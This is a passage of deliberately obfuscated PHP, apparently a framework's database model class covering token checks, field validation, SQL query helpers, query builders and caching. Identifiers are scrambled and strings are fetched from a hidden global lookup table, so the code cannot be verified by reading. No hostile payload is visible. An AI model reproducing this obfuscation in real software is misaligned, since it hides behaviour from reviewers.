public function autoCheckToken($úŸ¨ãª) { $í«’ƒÃš =& $_SERVER[åÄ¼Ùßš]; if (isset($this->options[$í«’ƒÃš[378]]) && !$this->options[$í«’ƒÃš[378]]) { return !0; } if (think_config($í«’ƒÃš[375])) { $Çåİ­’ = think_config($í«’ƒÃš[376]); if (!isset($úŸ¨ãª[$Çåİ­’]) || Session::get($Çåİ­’)) { return !1; } list($ä›û”ì, $œ‘¡º¨) = explode($í«’ƒÃš[11], $úŸ¨ãª[$Çåİ­’]); if ($œ‘¡º¨ && Session::get($Çåİ­’ . $í«’ƒÃš[10] . $ä›û”ì) === $œ‘¡º¨) { Session::remove($Çåİ­’ . $í«’ƒÃš[10] . $ä›û”ì); return !0; } if (think_config($í«’ƒÃš[379])) { Session::remove($Çåİ­’ . $í«’ƒÃš[10] . $ä›û”ì); } return !1; } return !0; } public function regex($»Ë£ã—­, $ö©±Ò´) { $¼¢õÉç´ =& $_SERVER[åÄ¼Ùßš]; $æŸåÕÚ¢ = array($¼¢õÉç´[380] => $¼¢õÉç´[381], $¼¢õÉç´[382] => $¼¢õÉç´[383], $¼¢õÉç´[384] => $¼¢õÉç´[385], $¼¢õÉç´[386] => $¼¢õÉç´[387], $¼¢õÉç´[388] => $¼¢õÉç´[389], $¼¢õÉç´[390] => $¼¢õÉç´[391], $¼¢õÉç´[392] => $¼¢õÉç´[393], $¼¢õÉç´[368] => $¼¢õÉç´[394], $¼¢õÉç´[395] => $¼¢õÉç´[396]); if (isset($æŸåÕÚ¢[strtolower($ö©±Ò´)])) { $ö©±Ò´ = $æŸåÕÚ¢[strtolower($ö©±Ò´)]; } return preg_match($ö©±Ò´, $»Ë£ã—­) === 1; } private function autoOperation(&$Ò§èşî, $ËÖÛ‡¯) { $¨­õåÆ¸ =& $_SERVER[åÄ¼Ùßš]; if (!empty($this->options[$¨­õåÆ¸[397]])) { $“™¡îÃ¹ = $this->options[$¨­õåÆ¸[397]]; unset($this->options[$¨­õåÆ¸[397]]); } elseif (!empty($this->_auto)) { $“™¡îÃ¹ = $this->_auto; } if (isset($“™¡îÃ¹)) { foreach ($“™¡îÃ¹ as $ë«˜½¥Ÿ) { if (empty($ë«˜½¥Ÿ[2])) { $ë«˜½¥Ÿ[2] = THINK_MODEL_INSERT; } if ($ËÖÛ‡¯ == $ë«˜½¥Ÿ[2] || $ë«˜½¥Ÿ[2] == THINK_MODEL_BOTH) { switch (trim($ë«˜½¥Ÿ[3])) { case $¨­õåÆ¸[398]: case $¨­õåÆ¸[399]: $ß˜ó–Ó÷ = isset($ë«˜½¥Ÿ[4]) ? (array) $ë«˜½¥Ÿ[4] : array(); if (isset($Ò§èşî[$ë«˜½¥Ÿ[0]])) { array_unshift($ß˜ó–Ó÷, $Ò§èşî[$ë«˜½¥Ÿ[0]]); } if ($¨­õåÆ¸[398] == $ë«˜½¥Ÿ[3]) { $Ò§èşî[$ë«˜½¥Ÿ[0]] = call_user_func_array($ë«˜½¥Ÿ[1], $ß˜ó–Ó÷); } else { $Ò§èşî[$ë«˜½¥Ÿ[0]] = call_user_func_array(array(&$this, $ë«˜½¥Ÿ[1]), $ß˜ó–Ó÷); } break; case $¨­õåÆ¸[353]: $Ò§èşî[$ë«˜½¥Ÿ[0]] = $Ò§èşî[$ë«˜½¥Ÿ[1]]; break; case $¨­õåÆ¸[400]: if ($¨­õåÆ¸[12] === $Ò§èşî[$ë«˜½¥Ÿ[0]]) { unset($Ò§èşî[$ë«˜½¥Ÿ[0]]); } break; case $¨­õåÆ¸[401]: default: $Ò§èşî[$ë«˜½¥Ÿ[0]] = $ë«˜½¥Ÿ[1]; } if (!1 === $Ò§èşî[$ë«˜½¥Ÿ[0]]) { unset($Ò§èşî[$ë«˜½¥Ÿ[0]]); } } } } return $Ò§èşî; } protected function autoValidation($º“²ãã, $ÍÆ•¬æí) { $²‡ÜÍÄ¼ =& $_SERVER[åÄ¼Ùßš]; if (!empty($this->options[$²‡ÜÍÄ¼[402]])) { $¸…ãô„È = $this->options[$²‡ÜÍÄ¼[402]]; unset($this->options[$²‡ÜÍÄ¼[402]]); } elseif (!empty($this->_validate)) { $¸…ãô„È = $this->_validate; } if (isset($¸…ãô„È)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¸…ãô„È as $¢ŸÎıË” => $¿µ¹üü…) { if (empty($¿µ¹üü…[5]) || $¿µ¹üü…[5] == THINK_MODEL_BOTH || $¿µ¹üü…[5] == $ÍÆ•¬æí) { if (0 == strpos($¿µ¹üü…[2], $²‡ÜÍÄ¼[403]) && strpos($¿µ¹üü…[2], $²‡ÜÍÄ¼[404])) { $¿µ¹üü…[2] = think_lang(substr($¿µ¹üü…[2], 2, -1)); } $¿µ¹üü…[3] = isset($¿µ¹üü…[3]) ? $¿µ¹üü…[3] : THINK_EXISTS_VALIDATE; $¿µ¹üü…[4] = isset($¿µ¹üü…[4]) ? $¿µ¹üü…[4] : $²‡ÜÍÄ¼[405]; switch ($¿µ¹üü…[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($º“²ãã, $¿µ¹üü…)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($²‡ÜÍÄ¼[12] != trim($º“²ãã[$¿µ¹üü…[0]])) { if (!1 === $this->_validationField($º“²ãã, $¿µ¹üü…)) { return !1; } } break; default: if (isset($º“²ãã[$¿µ¹üü…[0]])) { if (!1 === $this->_validationField($º“²ãã, $¿µ¹üü…)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ó¥÷¡ªÅ, $ÔÍ€‚ó) { if (!1 === $this->_validationFieldItem($Ó¥÷¡ªÅ, $ÔÍ€‚ó)) { if ($this->patchValidate) { $this->error[$ÔÍ€‚ó[0]] = $ÔÍ€‚ó[2]; } else { $this->error = $ÔÍ€‚ó[2]; return !1; } } return; } protected function _validationFieldItem($¨ÜÏ‹¢¶, $¾‹·›§’) { $›¿œâÂÀ =& $_SERVER[åÄ¼Ùßš]; switch (strtolower(trim($¾‹·›§’[4]))) { case $›¿œâÂÀ[398]: case $›¿œâÂÀ[399]: $Šœï†òº = isset($¾‹·›§’[6]) ? (array) $¾‹·›§’[6] : array(); if (is_string($¾‹·›§’[0]) && strpos($¾‹·›§’[0], $›¿œâÂÀ[50])) { $¾‹·›§’[0] = explode($›¿œâÂÀ[50], $¾‹·›§’[0]); } if (is_array($¾‹·›§’[0])) { foreach ($¾‹·›§’[0] as $¨Š²í¸÷) { $™ñ “ıš[$¨Š²í¸÷] = $¨ÜÏ‹¢¶[$¨Š²í¸÷]; } array_unshift($Šœï†òº, $™ñ “ıš); } else { array_unshift($Šœï†òº, $¨ÜÏ‹¢¶[$¾‹·›§’[0]]); } if ($›¿œâÂÀ[398] == $¾‹·›§’[4]) { return call_user_func_array($¾‹·›§’[1], $Šœï†òº); } else { return call_user_func_array(array(&$this, $¾‹·›§’[1]), $Šœï†òº); } case $›¿œâÂÀ[406]: return $¨ÜÏ‹¢¶[$¾‹·›§’[0]] == $¨ÜÏ‹¢¶[$¾‹·›§’[1]]; case $›¿œâÂÀ[407]: if (is_string($¾‹·›§’[0]) && strpos($¾‹·›§’[0], $›¿œâÂÀ[50])) { $¾‹·›§’[0] = explode($›¿œâÂÀ[50], $¾‹·›§’[0]); } $Ï“½ğ¶Ó = array(); if (is_array($¾‹·›§’[0])) { foreach ($¾‹·›§’[0] as $¨Š²í¸÷) { $Ï“½ğ¶Ó[$¨Š²í¸÷] = $¨ÜÏ‹¢¶[$¨Š²í¸÷]; } } else { $Ï“½ğ¶Ó[$¾‹·›§’[0]] = $¨ÜÏ‹¢¶[$¾‹·›§’[0]]; } if (!empty($¨ÜÏ‹¢¶[$this->getPk()])) { $Ï“½ğ¶Ó[$this->getPk()] = array($›¿œâÂÀ[408], $¨ÜÏ‹¢¶[$this->getPk()]); } if ($this->where($Ï“½ğ¶Ó)->find()) { return !1; } return !0; default: return $this->check($¨ÜÏ‹¢¶[$¾‹·›§’[0]], $¾‹·›§’[1], $¾‹·›§’[4]); } } public function check($²Ûì¢Ü“, $ÍìÒÀÀÌ, $ÂÌªŠîÀ = "\x72\145\147\145\x78") { $±şäÂõé =& $_SERVER[åÄ¼Ùßš]; $ÂÌªŠîÀ = strtolower(trim($ÂÌªŠîÀ)); switch ($ÂÌªŠîÀ) { case $±şäÂõé[7]: case $±şäÂõé[409]: $İ Õˆé = is_array($ÍìÒÀÀÌ) ? $ÍìÒÀÀÌ : explode($±şäÂõé[50], $ÍìÒÀÀÌ); return $ÂÌªŠîÀ == $±şäÂõé[7] ? in_array($²Ûì¢Ü“, $İ Õˆé) : !in_array($²Ûì¢Ü“, $İ Õˆé); case $±şäÂõé[410]: case $±şäÂõé[411]: if (is_array($ÍìÒÀÀÌ)) { $È±¾‰„Ø = $ÍìÒÀÀÌ[0]; $ëó†º—° = $ÍìÒÀÀÌ[1]; } else { list($È±¾‰„Ø, $ëó†º—°) = explode($±şäÂõé[50], $ÍìÒÀÀÌ); } return $ÂÌªŠîÀ == $±şäÂõé[410] ? $²Ûì¢Ü“ >= $È±¾‰„Ø && $²Ûì¢Ü“ <= $ëó†º—° : $²Ûì¢Ü“ < $È±¾‰„Ø || $²Ûì¢Ü“ > $ëó†º—°; case $±şäÂõé[412]: case $±şäÂõé[413]: return $ÂÌªŠîÀ == $±şäÂõé[412] ? $²Ûì¢Ü“ == $ÍìÒÀÀÌ : $²Ûì¢Ü“ != $ÍìÒÀÀÌ; case $±şäÂõé[414]: $Û§Ì…Ë´ = mb_strlen($²Ûì¢Ü“, $±şäÂõé[415]); if (strpos($ÍìÒÀÀÌ, $±şäÂõé[50])) { list($È±¾‰„Ø, $ëó†º—°) = explode($±şäÂõé[50], $ÍìÒÀÀÌ); return $Û§Ì…Ë´ >= $È±¾‰„Ø && $Û§Ì…Ë´ <= $ëó†º—°; } else { return $Û§Ì…Ë´ == $ÍìÒÀÀÌ; } case $±şäÂõé[416]: list($ş¿¢–³ , $ış»×Ã§) = explode($±şäÂõé[50], $ÍìÒÀÀÌ); if (!is_numeric($ş¿¢–³ )) { $ş¿¢–³  = strtotime($ş¿¢–³ ); } if (!is_numeric($ış»×Ã§)) { $ış»×Ã§ = strtotime($ış»×Ã§); } return NOW_TIME >= $ş¿¢–³  && NOW_TIME <= $ış»×Ã§; case $±şäÂõé[417]: return in_array(get_client_ip(), explode($±şäÂõé[50], $ÍìÒÀÀÌ)); case $±şäÂõé[418]: return !in_array(get_client_ip(), explode($±şäÂõé[50], $ÍìÒÀÀÌ)); case $±şäÂõé[405]: default: return $this->regex($²Ûì¢Ü“, $ÍìÒÀÀÌ); } } public function query($ı¡ÌœÀ³, $ìö»ê­ = false) { $×Ô¡£Ù =& $_SERVER[åÄ¼Ùßš]; if (!is_bool($ìö»ê­) && !is_array($ìö»ê­)) { $ìö»ê­ = func_get_args(); array_shift($ìö»ê­); } $ı¡ÌœÀ³ = str_replace(array($×Ô¡£Ù[288], $×Ô¡£Ù[419]), $×Ô¡£Ù[53], $ı¡ÌœÀ³); $ı¡ÌœÀ³ = $this->parseSql($ı¡ÌœÀ³, $ìö»ê­); return $this->db->query($ı¡ÌœÀ³); } public function execute($ë‹Å¼ÙŞ, $‹®¢×Ç = false) { if (!is_bool($‹®¢×Ç) && !is_array($‹®¢×Ç)) { $‹®¢×Ç = func_get_args(); array_shift($‹®¢×Ç); } $ë‹Å¼ÙŞ = $this->parseSql($ë‹Å¼ÙŞ, $‹®¢×Ç); return $this->db->execute($ë‹Å¼ÙŞ); } protected function parseSql($±£Â‚Û©, $‚Şª£Ú) { $çÓ°ñø­ =& $_SERVER[åÄ¼Ùßš]; if (!0 === $‚Şª£Ú) { $Úîğæï¯ = $this->_parseOptions(); $±£Â‚Û© = $this->db->parseSql($±£Â‚Û©, $Úîğæï¯); } elseif (is_array($‚Şª£Ú)) { $‚Şª£Ú = array_map(array($this->db, $çÓ°ñø­[420]), $‚Şª£Ú); $±£Â‚Û© = vsprintf($±£Â‚Û©, $‚Şª£Ú); } else { $±£Â‚Û© = strtr($±£Â‚Û©, array($çÓ°ñø­[421] => $this->getTableName(), $çÓ°ñø­[422] => think_config($çÓ°ñø­[324]))); } $this->db->setModel($this->name); return $±£Â‚Û©; } public function db($˜‡€Ìş¡ = '', $÷Êğ»‹ = '', $úÙ‰µ’ = array()) { $ Çğºßµ =& $_SERVER[åÄ¼Ùßš]; if ($ Çğºßµ[12] === $˜‡€Ìş¡ && $this->db) { return $this->db; } static $–òÁ‘œâ = array(); static $îŸ®Šºü = array(); if (!isset($îŸ®Šºü[$˜‡€Ìş¡]) || isset($îŸ®Šºü[$˜‡€Ìş¡]) && $÷Êğ»‹ && $–òÁ‘œâ[$˜‡€Ìş¡] != $÷Êğ»‹) { if (!empty($÷Êğ»‹) && is_string($÷Êğ»‹) && !1 === strpos($÷Êğ»‹, $ Çğºßµ[8])) { $÷Êğ»‹ = think_config($÷Êğ»‹); } $˜‡€Ìş¡ = think_guid($÷Êğ»‹); $îŸ®Šºü[$˜‡€Ìş¡] = Db::getInstance($÷Êğ»‹); } elseif (NULL === $÷Êğ»‹) { $îŸ®Šºü[$˜‡€Ìş¡]->close(); unset($îŸ®Šºü[$˜‡€Ìş¡]); return; } if (!empty($úÙ‰µ’)) { if (is_string($úÙ‰µ’)) { parse_str($úÙ‰µ’, $úÙ‰µ’); } foreach ($úÙ‰µ’ as $Æ‘ïü¥³ => $ÕíÜÎŒÎ) { $this->setProperty($Æ‘ïü¥³, $ÕíÜÎŒÎ); } } $–òÁ‘œâ[$˜‡€Ìş¡] = $÷Êğ»‹; $this->db = $îŸ®Šºü[$˜‡€Ìş¡]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $º­êéÉ = get_class($this); if ($º­êéÉ == $_SERVER[åÄ¼Ùßš][423]) { return $this->name; } $this->name = substr($º­êéÉ, 0, -5); } return $this->name; } public function getTableName() { $¢‘¸Æ¡ =& $_SERVER[åÄ¼Ùßš]; if (empty($this->trueTableName)) { $Ï¿Ù‘–Ä = !empty($this->tablePrefix) ? $this->tablePrefix : $¢‘¸Æ¡[12]; if (!empty($this->tableName)) { $Ï¿Ù‘–Ä .= $this->tableName; } else { $Ï¿Ù‘–Ä .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ï¿Ù‘–Ä); } return (!empty($this->dbName) ? $this->dbName . $¢‘¸Æ¡[10] : $¢‘¸Æ¡[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÊÆôÑ½¸ =& $_SERVER[åÄ¼Ùßš]; return isset($this->fields[$ÊÆôÑ½¸[331]]) ? $this->fields[$ÊÆôÑ½¸[331]] : $this->pk; } public function getDbFields() { $¸ğÇ¹É¤ =& $_SERVER[åÄ¼Ùßš]; if (isset($this->options[$¸ğÇ¹É¤[359]])) { $¸û¦ëóé = $this->db->getFields($this->options[$¸ğÇ¹É¤[359]]); return $¸û¦ëóé ? array_keys($¸û¦ëóé) : !1; } if ($this->fields) { $¸û¦ëóé = $this->fields; unset($¸û¦ëóé[$¸ğÇ¹É¤[330]], $¸û¦ëóé[$¸ğÇ¹É¤[331]], $¸û¦ëóé[$¸ğÇ¹É¤[332]], $¸û¦ëóé[$¸ğÇ¹É¤[329]]); return $¸û¦ëóé; } return !1; } public function data($µğÀ‘û… = '') { $…ĞÍ£ƒõ =& $_SERVER[åÄ¼Ùßš]; if ($…ĞÍ£ƒõ[12] === $µğÀ‘û… && !empty($this->data)) { return $this->data; } if (is_object($µğÀ‘û…)) { $µğÀ‘û… = get_object_vars($µğÀ‘û…); } elseif (is_string($µğÀ‘û…)) { parse_str($µğÀ‘û…, $µğÀ‘û…); } elseif (!is_array($µğÀ‘û…)) { think_exception(think_lang($…ĞÍ£ƒõ[351])); } $this->data = $µğÀ‘û…; return $this; } public function join($ı€«Ä¨) { $™åãÂÈ =& $_SERVER[åÄ¼Ùßš]; if (is_array($ı€«Ä¨)) { $this->options[$™åãÂÈ[362]] = $ı€«Ä¨; } elseif (!empty($ı€«Ä¨)) { $this->options[$™åãÂÈ[362]][] = $ı€«Ä¨; } return $this; } public function union($úÌÍíë, $ÆÁ€ïâ = false) { $³¯î¡¤ =& $_SERVER[åÄ¼Ùßš]; if (empty($úÌÍíë)) { return $this; } if ($ÆÁ€ïâ) { $this->options[$³¯î¡¤[424]][$³¯î¡¤[425]] = !0; } if (is_object($úÌÍíë)) { $úÌÍíë = get_object_vars($úÌÍíë); } if (is_string($úÌÍíë)) { $ş²«è˜Ö = $úÌÍíë; } elseif (is_array($úÌÍíë)) { if (isset($úÌÍíë[0])) { $this->options[$³¯î¡¤[424]] = array_merge($this->options[$³¯î¡¤[424]], $úÌÍíë); return $this; } else { $ş²«è˜Ö = $úÌÍíë; } } else { think_exception(think_lang($³¯î¡¤[351])); } $this->options[$³¯î¡¤[424]][] = $ş²«è˜Ö; return $this; } public function cache($¦˜ô±‡ğ = true, $ÑÒãğ¼ = null, $µ¨ãŠÄ = '') { $‰ñ³–®Ö =& $_SERVER[åÄ¼Ùßš]; if (!1 !== $¦˜ô±‡ğ) { $this->options[$‰ñ³–®Ö[426]] = array($‰ñ³–®Ö[97] => $¦˜ô±‡ğ, $‰ñ³–®Ö[416] => $ÑÒãğ¼, $‰ñ³–®Ö[33] => $µ¨ãŠÄ); } return $this; } public function field($æ÷ıù…¡, $’üÔö’ = false) { $ö¢¸Œ¼¯ =& $_SERVER[åÄ¼Ùßš]; if (!0 === $æ÷ıù…¡) { $¿³½ŞŸÉ = $this->getDbFields(); $æ÷ıù…¡ = $¿³½ŞŸÉ ? $¿³½ŞŸÉ : $ö¢¸Œ¼¯[223]; } elseif ($’üÔö’) { if (is_string($æ÷ıù…¡)) { $æ÷ıù…¡ = explode($ö¢¸Œ¼¯[50], $æ÷ıù…¡); } $¿³½ŞŸÉ = $this->getDbFields(); $æ÷ıù…¡ = $¿³½ŞŸÉ ? array_diff($¿³½ŞŸÉ, $æ÷ıù…¡) : $æ÷ıù…¡; } $this->options[$ö¢¸Œ¼¯[353]] = $æ÷ıù…¡; return $this; } public function scope($Ã–¥®êõ = '', $˜’æŠ´ = NULL) { $Â£Ñ¤× =& $_SERVER[åÄ¼Ùßš]; if ($Â£Ñ¤×[12] === $Ã–¥®êõ) { if (isset($this->_scope[$Â£Ñ¤×[37]])) { $™‘µË»Ğ = $this->_scope[$Â£Ñ¤×[37]]; } else { return $this; } } elseif (is_string($Ã–¥®êõ)) { $Öõ¶êõê = explode($Â£Ñ¤×[50], $Ã–¥®êõ); $™‘µË»Ğ = array(); foreach ($Öõ¶êõê as $£¹’É€) { if (!isset($this->_scope[$£¹’É€])) { continue; } $™‘µË»Ğ = array_merge($™‘µË»Ğ, $this->_scope[$£¹’É€]); } if (!empty($˜’æŠ´) && is_array($˜’æŠ´)) { $™‘µË»Ğ = array_merge($™‘µË»Ğ, $˜’æŠ´); } } elseif (is_array($Ã–¥®êõ)) { $™‘µË»Ğ = $Ã–¥®êõ; } if (is_array($™‘µË»Ğ) && !empty($™‘µË»Ğ)) { $this->options = array_merge($this->options, array_change_key_case($™‘µË»Ğ)); } return $this; } public function where($ë–ş‡Ğû, $÷âÍˆÒ = null) { $ÓƒÒ¦× =& $_SERVER[åÄ¼Ùßš]; if (!is_null($÷âÍˆÒ) && is_string($ë–ş‡Ğû)) { if (!is_array($÷âÍˆÒ)) { $÷âÍˆÒ = func_get_args(); array_shift($÷âÍˆÒ); } $÷âÍˆÒ = array_map(array($this->db, $ÓƒÒ¦×[420]), $÷âÍˆÒ); $ë–ş‡Ğû = vsprintf($ë–ş‡Ğû, $÷âÍˆÒ); } elseif (is_object($ë–ş‡Ğû)) { $ë–ş‡Ğû = get_object_vars($ë–ş‡Ğû); } elseif (is_array($ë–ş‡Ğû)) { foreach ($ë–ş‡Ğû as $éÌøÃ¹ => $íæêš) { if ((is_numeric($éÌøÃ¹) || !$éÌøÃ¹) && is_string($íæêš)) { if (strpos($íæêš, $ÓƒÒ¦×[427]) === 0) { continue; } think_trace($ÓƒÒ¦×[428], $ÓƒÒ¦×[12], $ÓƒÒ¦×[49]); die; } } } if (is_string($ë–ş‡Ğû) && $ÓƒÒ¦×[12] != $ë–ş‡Ğû) { $¸ƒçõ² = array(); $¸ƒçõ²[$ÓƒÒ¦×[429]] = $ë–ş‡Ğû; $ë–ş‡Ğû = $¸ƒçõ²; } if (isset($this->options[$ÓƒÒ¦×[355]])) { $this->options[$ÓƒÒ¦×[355]] = array_merge($this->options[$ÓƒÒ¦×[355]], $ë–ş‡Ğû); } else { $this->options[$ÓƒÒ¦×[355]] = $ë–ş‡Ğû; } return $this; } public function limit($‰è‰ö‡ş, $€ÈÖ¶Û = null) { $¹ìÅåğâ =& $_SERVER[åÄ¼Ùßš]; $this->options[$¹ìÅåğâ[370]] = is_null($€ÈÖ¶Û) ? $‰è‰ö‡ş : $‰è‰ö‡ş . $¹ìÅåğâ[50] . $€ÈÖ¶Û; return $this; } public function page($Å¥²§Öğ, $£û¨ÕØĞ = null) { $èˆ±¢²˜ =& $_SERVER[åÄ¼Ùßš]; $this->options[$èˆ±¢²˜[430]] = is_null($£û¨ÕØĞ) ? $Å¥²§Öğ : $Å¥²§Öğ . $èˆ±¢²˜[50] . $£û¨ÕØĞ; return $this; } public function comment($‡ñ¸Ó½¡) { $this->options[$_SERVER[åÄ¼Ùßš][431]] = $‡ñ¸Ó½¡; return $this; } public function setProperty($±ÌñØ§Š, $ÅàÉŞ®) { if (property_exists($this, $±ÌñØ§Š)) { $this->{$±ÌñØ§Š} = $ÅàÉŞ®; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\x79\124\151\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\145\162\x74\x2c\x75\x70\144\141\164\145", "\x66\165\156\143\x74\x69\x6f\156"), array("\143\162\x65\x61\x74\x65\124\x69\x6d\145", "\164\x69\155\145", "\x69\156\163\145\162\164", "\146\165\x6e\x63\x74\x69\x6f\x6e")); public function setDataAuto($ûÂıÔÎ) { $this->dataAuto = $ûÂıÔÎ; } public function __construct($ì…áİï = '', $ÕÙÃÓ = '', $–ı©­‘Ì = '') { parent::__construct($ì…áİï, $ÕÙÃÓ, $–ı©­‘Ì); } protected $tableMeta = array(); protected function _beforeInsert(&$‰ÃÄøå, $»‰‰¸á½) { $Ã¶†ÏÂ‰ =& $_SERVER[åÄ¼Ùßš]; if (!$this->checkDataAutoHas($Ã¶†ÏÂ‰[432])) { return; } $this->dataBeforeFilter($‰ÃÄøå, $Ã¶†ÏÂ‰[432]); } protected function _beforeUpdate(&$ò¼È„¥¯, $´¡á×Øµ) { $È”Ö‰ñÏ =& $_SERVER[åÄ¼Ùßš]; if (!$this->checkDataAutoHas($È”Ö‰ñÏ[433])) { return; } $this->dataBeforeFilter($ò¼È„¥¯, $È”Ö‰ñÏ[433]); } protected function _afterSelect(&$ÑÚ©ú—‚, $‚Óİ€ïª) { if (!is_array($ÑÚ©ú—‚)) { return; } if (!$this->checkDataAutoHas($_SERVER[åÄ¼Ùßš][434])) { return; } foreach ($ÑÚ©ú—‚ as &$’‡’óû¬) { $this->dataAfterFilter($’‡’óû¬); } unset($’‡’óû¬); } protected function _afterFind(&$À—Ã“È­, $Ìãì¬Ââ) { if (!is_array($À—Ã“È­)) { return; } if (!$this->checkDataAutoHas($_SERVER[åÄ¼Ùßš][434])) { return; } $this->dataAfterFilter($À—Ã“È­); } public static function textEncode($ê¾¤úÖ¹) { if (!$ê¾¤úÖ¹) { return $ê¾¤úÖ¹; } $ÃŞ™ÉãÏ = json_encode($ê¾¤úÖ¹); $ÃŞ™ÉãÏ = preg_replace_callback($_SERVER[åÄ¼Ùßš][435], function ($©ñ›İ¼) { return addslashes($©ñ›İ¼[0]); }, $ÃŞ™ÉãÏ); return json_decode($ÃŞ™ÉãÏ); } public static function textDecode($ê´úñ½) { $‡à®®µ =& $_SERVER[åÄ¼Ùßš]; $¯ñ’ÅØ = json_encode($ê´úñ½); $¯ñ’ÅØ = preg_replace_callback($‡à®®µ[436], function ($í’©ÀÖ†) { return $_SERVER[åÄ¼Ùßš][100]; }, $¯ñ’ÅØ); return json_decode($¯ñ’ÅØ); } public function setAutoIncrement($‰¥ß¼µ) { $À•È†Å = array($this->getPk() => $‰¥ß¼µ); $Å‘Ğü» = $this->data($À•È†Å)->add(); if ($Å‘Ğü») { $this->delete($Å‘Ğü»); } } public function getAutoIncrement() { $‹”ŸòÍ§ = $this->getTableName(); $Ã€€±ß = $this->max($this->getPk()); $ŸåÄ•ˆ = $this->query("\x73\150\x6f\167\x20\164\141\x62\x6c\145\x20\163\164\141\164\x75\163\40\167\150\x65\162\145\x20\116\141\x6d\145\x3d\47{$‹”ŸòÍ§}\x27"); $í§–™Ÿú = $ŸåÄ•ˆ[0][$_SERVER[åÄ¼Ùßš][437]]; $¾®ËéÕá = max($Ã€€±ß, $í§–™Ÿú); return $¾®ËéÕá; } protected function _callBefore($£ÍÙûÈå, $¯¿á›´) { return $this->cacheCallCheck($£ÍÙûÈå, $¯¿á›´, !1); } protected function _callAfter($Í¬Ë¥Ô¶, $ Œ€€æ˜) { return $this->cacheCallCheck($Í¬Ë¥Ô¶, $ Œ€€æ˜, !0); } protected function cacheFunctionAlias($ıØû°õÂ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÍÑî‘·¾, $ûº×¥œó, $ÚËäêÅë = false) { $¿Ä£Ì¿Î =& $_SERVER[åÄ¼Ùßš]; $€êÍ¨¤ = $this->cacheFunctionAlias($ûº×¥œó); if (!$€êÍ¨¤) { return; } foreach ($€êÍ¨¤ as $è¬Ïğ±Ë => $â¡³‚ã) { $ÏÊäÂÛ = $â¡³‚ã[0]; $œï“ºÂ = explode($¿Ä£Ì¿Î[50], $â¡³‚ã[1]); $™ŒãÚÖ = isset($â¡³‚ã[2]) ? $â¡³‚ã[2] : $¿Ä£Ì¿Î[12]; if ($ÍÑî‘·¾ == $è¬Ïğ±Ë) { return $this->cacheFunctionGet($è¬Ïğ±Ë, $ÏÊäÂÛ, $™ŒãÚÖ); } if ($ÚËäêÅë && in_array($ÍÑî‘·¾, $œï“ºÂ)) { $this->cacheFunctionClear($è¬Ïğ±Ë, $ÏÊäÂÛ, $™ŒãÚÖ); } } } public function cacheFunctionGet($•®è±‹ì, $ß­½Ô¨†, $óÏ½ïÚ = '') { $ÄÉÖÚ¬é = $this->cacheKeyMake($•®è±‹ì, $ß­½Ô¨†, $óÏ½ïÚ); $ŒÑ”åØÜ = Cache::get($ÄÉÖÚ¬é); if (!is_array($ŒÑ”åØÜ)) { $ŒÑ”åØÜ = call_user_func_array(array($this, $•®è±‹ì), array($ß­½Ô¨†, !0)); Cache::set($ÄÉÖÚ¬é, $ŒÑ”åØÜ); } return $ŒÑ”åØÜ; } public function cacheFunctionClear($Ü‘Ãûø”, $Í—€ó•Ú, $ìù‡Äîˆ = '') { $ÀÁ™à• = $Í—€ó•Ú; if (!is_array($Í—€ó•Ú)) { $ÀÁ™à• = array($Í—€ó•Ú); } foreach ($ÀÁ™à• as $üÇí´èæ) { $ÉÎĞ±¥ = $this->cacheKeyMake($Ü‘Ãûø”, $üÇí´èæ, $ìù‡Äîˆ); Cache::remove($ÉÎĞ±¥); } } public function cacheKeyMake($Ü·Ö¡¥, $áµ®ÙŠ, $˜ÇÛ–Û³) { $ãÕ¨÷¬µ =& $_SERVER[åÄ¼Ùßš]; if ($˜ÇÛ–Û³) { $áµ®ÙŠ = $áµ®ÙŠ . $ãÕ¨÷¬µ[438] . $˜ÇÛ–Û³; } return get_class($this) . $ãÕ¨÷¬µ[11] . $Ü·Ö¡¥ . $ãÕ¨÷¬µ[439] . $áµ®ÙŠ; } protected function selectPageReset() { $Œ×¸¼À =& $_SERVER[åÄ¼Ùßš]; if (isset($GLOBALS[$Œ×¸¼À[440]])) { return; } $GLOBALS[$Œ×¸¼À[440]] = isset($GLOBALS[$Œ×¸¼À[7]][$Œ×¸¼À[441]]) ? $GLOBALS[$Œ×¸¼À[7]][$Œ×¸¼À[441]] : !1; $GLOBALS[$Œ×¸¼À[442]] = isset($GLOBALS[$Œ×¸¼À[7]][$Œ×¸¼À[430]]) ? $GLOBALS[$Œ×¸¼À[7]][$Œ×¸¼À[430]] : !1; $GLOBALS[$Œ×¸¼À[7]][$Œ×¸¼À[441]] = !1; $GLOBALS[$Œ×¸¼À[7]][$Œ×¸¼À[430]] = !1; } protected function selectPageRestore() { $ŒÂÏ®Ğ =& $_SERVER[åÄ¼Ùßš]; if (!isset($GLOBALS[$ŒÂÏ®Ğ[440]])) { return; } $GLOBALS[$ŒÂÏ®Ğ[7]][$ŒÂÏ®Ğ[441]] = $GLOBALS[$ŒÂÏ®Ğ[440]]; $GLOBALS[$ŒÂÏ®Ğ[7]][$ŒÂÏ®Ğ[430]] = $GLOBALS[$ŒÂÏ®Ğ[442]]; if ($GLOBALS[$ŒÂÏ®Ğ[7]][$ŒÂÏ®Ğ[441]] === !1) { unset($GLOBALS[$ŒÂÏ®Ğ[7]][$ŒÂÏ®Ğ[441]]); } if ($GLOBALS[$ŒÂÏ®Ğ[7]][$ŒÂÏ®Ğ[430]] === !1) { 